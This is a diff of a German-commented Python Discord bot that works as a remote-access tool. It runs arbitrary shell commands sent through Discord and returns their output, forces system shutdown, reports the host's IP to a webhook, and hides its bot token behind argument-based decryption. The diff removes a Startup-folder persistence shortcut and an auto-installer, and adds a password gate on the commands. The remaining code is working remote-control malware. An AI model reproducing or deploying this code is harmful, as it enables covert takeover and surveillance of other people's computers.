@@ -1,19 +1,5 @@
 import sys
 import subprocess
-def install(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-
-# Liste der benötigten Pakete
-required_packages = ["discord", "dhooks", "cryptography"]  # Füge hier deine benötigten Module hinzu
-
-# Installiere jedes Paket, wenn es nicht bereits installiert ist
-for package in required_packages:
-    try:
-        __import__(package)
-        print(f"{package} ist bereits installiert")
-    except ImportError:
-        print(f"{package} wird installiert...")
-        install(package)
 from discord import app_commands
 from dhooks import Webhook
 from os import system
@@ -26,6 +12,17 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives import padding
 import base64
+import hashlib
+
+password_right = False
+
+def hash_string(input_string):
+    # SHA-256 Hash erzeugen
+    sha256_hash = hashlib.sha256()
+    sha256_hash.update(input_string.encode('utf-8'))
+    return sha256_hash.hexdigest()
+
+hashed_passwd = "58739f701f1f3b0f135e8a9e2c4a450eb180ceb0aab301c9bb21e23ec4abcebf"
 
 def decrypt_string(password, encrypted_data):
     encrypted_data = base64.b64decode(encrypted_data)
@@ -65,9 +62,6 @@ output = result.stdout
 username_split = output.split("\\")
 username = username_split[1]
 hostname = username_split[0]
-autostartpath = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-targetpath = f"C:\\Users\\{username}\\payload.py"
-system(f'powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut(\'{autostartpath}\\comandcon.ink');$s.TargetPath=\'pythonw {targetpath} {argument}';$s.Save()"')
 # Beim Starten des Bots wird die IP-Adresse an den Webhook gesendet
 @client.event
 async def on_ready():
@@ -84,9 +78,11 @@ async def on_ready():
     guild=discord.Object(id=1220080097370046607)
 )
 async def run_command(interaction, command: str):
-    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    output = result.stdout
-    await interaction.response.send_message(f'Kommando: {command}\nOutput: {output}')
+    global password_right
+    if password_right:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        output = result.stdout
+        await interaction.response.send_message(f'Kommando: {command}\nOutput: {output}')
 
 # Command zum Herunterfahren des Computers
 @tree.command(
@@ -95,16 +91,43 @@ async def run_command(interaction, command: str):
     guild=discord.Object(id=1220080097370046607)
 )
 async def shutdown_command(interaction):
-    await interaction.response.send_message("Fahre den Computer herunter...")
-    system("shutdown /s /t 0 /f")
-    
+    global password_right
+    if password_right:
+        await interaction.response.send_message("Fahre den Computer herunter...")
+        system("shutdown /s /t 0 /f")
+
+# Command zum Entsperren der Commands mit Passworteingabe
+@tree.command(
+    name="password",
+    description="Passworteingabe zum Entsperren der Commands",
+    guild=discord.Object(id=1220080097370046607)
+)
+async def password_command(interaction, password: str): # hier habe ich die Benutzereingabe hinzugefügt
+    if hash_string(password) == hashed_passwd:
+        await interaction.response.send_message("Passwort Richtig")
+        global password_right
+        password_right = True
+    else:
+        await interaction.response.send_message("Falsches Passwort!")
+
+# Command zum Herunterfahren des Computers
+@tree.command(
+    name="resetpassword",
+    description="Resettet das Passwort",
+    guild=discord.Object(id=1220080097370046607)
+)
+async def resetpasswd(interaction):
+    await interaction.response.send_message("Passwort Resettet")
+    global password_right
+    password_right = False
+
 if len(sys.argv) > 1:
     argument = sys.argv[1]
     print(f"Das übergebene Argument ist: {argument}")
 else:
     sys.exit()
 token = decrypt_string(argument, "pEt0ACzUovE+6Jcxb5idaoU6kOMaYzWzd8R6VGoU3UhimrGfRU+rdqTBMLgVcWVdJpFJr1xx0n8xGtTPLX3xbsF2BsZowt4x53RYeofblYZmwEq+4gOCqbXLPIVBQKzg4M2JLD1J4GHBqTPcp6Qmcw==")
-if decrypted == "err":
+if token == "err":
     sys.exit()
 
 # Bot starten
